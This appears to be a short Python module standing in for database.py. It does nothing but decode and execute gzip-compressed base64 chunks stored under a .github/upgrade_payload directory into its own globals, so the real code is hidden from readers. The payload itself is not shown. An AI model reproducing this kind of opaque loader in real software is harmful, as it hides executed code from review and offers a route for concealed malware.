from __future__ import annotations

from payload_loader import exec_gzip_base64_payload

exec_gzip_base64_payload(
    globals(),
    [
        ".github/upgrade_payload/database.00",
        ".github/upgrade_payload/database.01",
        ".github/upgrade_payload/database.02",
        ".github/upgrade_payload/database.03",
    ],
    "database.py",
)
